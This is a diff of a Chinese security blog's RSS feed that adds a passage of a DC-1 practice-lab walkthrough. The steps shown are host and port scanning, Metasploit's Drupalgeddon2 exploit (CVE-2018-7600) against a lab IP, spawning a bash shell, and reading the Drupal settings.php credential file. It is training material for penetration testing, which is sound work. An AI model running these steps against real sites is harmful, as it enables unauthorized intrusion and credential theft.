@@ -1,19 +1,899 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
-        <title>靶场 on 鼎星安全</title>
+        <title>靶场 on 鼎新安全</title>
         <link>https://dxlaboratory.github.io/categories/%E9%9D%B6%E5%9C%BA/</link>
-        <description>Recent content in 靶场 on 鼎星安全</description>
+        <description>Recent content in 靶场 on 鼎新安全</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
-        <copyright>鼎星实验室</copyright>
+        <copyright>鼎新实验室</copyright>
         <lastBuildDate>Thu, 31 Oct 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://dxlaboratory.github.io/categories/%E9%9D%B6%E5%9C%BA/index.xml" rel="self" type="application/rss+xml" /><item>
-        <title>DC-2</title>
-        <link>https://dxlaboratory.github.io/p/test-chinese/</link>
+        <title>DC-1</title>
+        <link>https://dxlaboratory.github.io/p/test1-chinese/</link>
         <pubDate>Thu, 31 Oct 2024 00:00:00 +0000</pubDate>
         
-        <guid>https://dxlaboratory.github.io/p/test-chinese/</guid>
-        <description>&lt;img src="https://dxlaboratory.github.io/20241104083955.jpg" alt="Featured image of post DC-2" /&gt;&lt;h1 id=&#34;前言&#34;&gt;前言
+        <guid>https://dxlaboratory.github.io/p/test1-chinese/</guid>
+        <description>&lt;p&gt;+++&lt;/p&gt;
+&lt;h1 id=&#34;一信息收集&#34;&gt; 一.信息收集
+&lt;/h1&gt;&lt;h2 id=&#34;主机发现&#34;&gt;主机发现
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;arp-scan -l
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/e111f783d1ea46b5a067cd959d39ead6.png&#34;
+	width=&#34;1128&#34;
+	height=&#34;285&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/e111f783d1ea46b5a067cd959d39ead6_hu5664945937923100166.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/e111f783d1ea46b5a067cd959d39ead6_hu17603787849804340998.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;395&#34;
+		data-flex-basis=&#34;949px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;发现主机&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;192.168.36.43
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;扫描目标ip开放端口&#34;&gt;扫描目标ip开放端口
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sV -p- 192.168.36.43
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;#-sV 扫描目标主机端口上运行的软件信息 #-p- 扫描全部端口0-65535&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/fbc98a132dcb4eaaa3a103cdd0ebc912.png&#34;
+	width=&#34;1172&#34;
+	height=&#34;432&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/fbc98a132dcb4eaaa3a103cdd0ebc912_hu14570505018952576058.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/fbc98a132dcb4eaaa3a103cdd0ebc912_hu8471845362508914401.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;271&#34;
+		data-flex-basis=&#34;651px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;访问80端口&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/f0396ee695ba43bfaee61119e8461558.png&#34;
+	width=&#34;2189&#34;
+	height=&#34;1212&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/f0396ee695ba43bfaee61119e8461558_hu3684524924363148936.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/f0396ee695ba43bfaee61119e8461558_hu8011964106906344834.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;180&#34;
+		data-flex-basis=&#34;433px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;h2 id=&#34;获取信息&#34;&gt;获取信息
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/299a9d8cfe1a46abba56b2dc3ddd1820.png&#34;
+	width=&#34;2131&#34;
+	height=&#34;1072&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/299a9d8cfe1a46abba56b2dc3ddd1820_hu7604677178965251716.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/299a9d8cfe1a46abba56b2dc3ddd1820_hu8860553450272553445.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;198&#34;
+		data-flex-basis=&#34;477px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;可以利用kali中的自带工具whatqweb工具&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;whatweb -v 192.168.36.43
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/f3fe7a00899c4b5f8e2984520eb3dc08.png&#34;
+	width=&#34;1441&#34;
+	height=&#34;367&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/f3fe7a00899c4b5f8e2984520eb3dc08_hu2073859247924115825.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/f3fe7a00899c4b5f8e2984520eb3dc08_hu13019439150556423008.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;392&#34;
+		data-flex-basis=&#34;942px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;也可以上网查询其历史漏洞&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/1359f14a3fb0469595f615f1a96cc133.png&#34;
+	width=&#34;1947&#34;
+	height=&#34;1189&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/1359f14a3fb0469595f615f1a96cc133_hu11229250754773569096.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/1359f14a3fb0469595f615f1a96cc133_hu13879542650233690777.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;163&#34;
+		data-flex-basis=&#34;393px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;h1 id=&#34;二漏洞利用&#34;&gt;二.漏洞利用
+&lt;/h1&gt;&lt;p&gt;Metasploit利用&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msfconsole
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/43aa9f84f6bc458c804dee14725bbba7.png&#34;
+	width=&#34;817&#34;
+	height=&#34;566&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/43aa9f84f6bc458c804dee14725bbba7_hu3014726427450360231.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/43aa9f84f6bc458c804dee14725bbba7_hu16312082844713181849.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;144&#34;
+		data-flex-basis=&#34;346px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;查询模块&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;search drupal
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/80f2831d2a204b51a8a08f3a9a83cad5.png&#34;
+	width=&#34;1713&#34;
+	height=&#34;488&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/80f2831d2a204b51a8a08f3a9a83cad5_hu8405197348984619584.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/80f2831d2a204b51a8a08f3a9a83cad5_hu5213950796966186572.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;351&#34;
+		data-flex-basis=&#34;842px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;利用2018年的这个漏洞（远程代码执行）&lt;/p&gt;
+&lt;p&gt;漏洞编号：CVE-2018-7600&lt;/p&gt;
+&lt;p&gt;Drupal 6,7,8等多个子版本存在远程代码执行漏洞&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;use exploit/unix/webapp/drupal_drupalgeddon2
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/317dc054756f42c3a6ff84d6405a61b2.png&#34;
+	width=&#34;866&#34;
+	height=&#34;83&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/317dc054756f42c3a6ff84d6405a61b2_hu16204486899756675198.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/317dc054756f42c3a6ff84d6405a61b2_hu16832364908836164584.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1043&#34;
+		data-flex-basis=&#34;2504px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;然后&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set RHOSTS 192.168.36.43
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;exploit
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/068d3cfa0bdd408d8a6ed9091c0d0444.png&#34;
+	width=&#34;1296&#34;
+	height=&#34;255&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/068d3cfa0bdd408d8a6ed9091c0d0444_hu15536626466726892344.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/068d3cfa0bdd408d8a6ed9091c0d0444_hu1921276497201884386.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;508&#34;
+		data-flex-basis=&#34;1219px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;python进行交换式环境&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python -c &amp;#34;import pty; pty.spawn(&amp;#39;/bin/bash&amp;#39;)&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/419717529f6f40efae484b7bd061618e.png&#34;
+	width=&#34;390&#34;
+	height=&#34;64&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/419717529f6f40efae484b7bd061618e_hu14030361695965352524.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/419717529f6f40efae484b7bd061618e_hu10108452869794766692.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;609&#34;
+		data-flex-basis=&#34;1462px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​编辑&lt;/p&gt;
+&lt;h2 id=&#34;flag1&#34;&gt;flag1
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/a41511770eff4a4cb797720f7c3ed173.png&#34;
+	width=&#34;969&#34;
+	height=&#34;201&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/a41511770eff4a4cb797720f7c3ed173_hu18329530849911759171.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/a41511770eff4a4cb797720f7c3ed173_hu17418433253927265359.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;482&#34;
+		data-flex-basis=&#34;1157px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;查看&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/ff73a799ff144ce9bbfc264aaf8d970c.png&#34;
+	width=&#34;649&#34;
+	height=&#34;92&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/ff73a799ff144ce9bbfc264aaf8d970c_hu17506564032484975943.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/ff73a799ff144ce9bbfc264aaf8d970c_hu15456988278849413416.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;705&#34;
+		data-flex-basis=&#34;1693px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​编辑&lt;/p&gt;
+&lt;p&gt;意为每个好的 CMS 都需要一个配置文件 - 你也一样&lt;/p&gt;
+&lt;p&gt;查找类似的配置文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find ./ -name &amp;#34;set*&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/75e14f566a804f698d4d113d4e907811.png&#34;
+	width=&#34;563&#34;
+	height=&#34;78&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/75e14f566a804f698d4d113d4e907811_hu14633495847028707679.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/75e14f566a804f698d4d113d4e907811_hu4618988174780245560.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;721&#34;
+		data-flex-basis=&#34;1732px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​编辑&lt;/p&gt;
+&lt;p&gt;查看里面内容&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat sites/default/settings.php
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
